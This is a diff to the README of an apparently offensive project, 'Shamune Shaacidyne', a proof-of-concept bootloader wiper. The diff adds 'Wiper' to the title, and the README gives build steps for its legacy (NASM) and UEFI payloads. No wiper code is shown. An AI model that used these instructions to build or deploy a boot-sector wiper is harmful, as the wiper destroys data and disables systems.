@@ -1,4 +1,4 @@
-# Shamune Shaacidyne #
+# Shamune Shaacidyne Wiper #
 Shaacidyne is a basic proof-of-concept bootloader wiper written in python, ASM, and C.
 1. FOR LEGACY Payload, check the bootloader.asm and compile it: nasm -f bin -o bootloader.bin bootloader.asm (assemble via NASM).
 2. FOR UEFI Payload: You should convert it to a .efi file using EDK or MSYS2 with GNU-EFI and GCC Compiler.
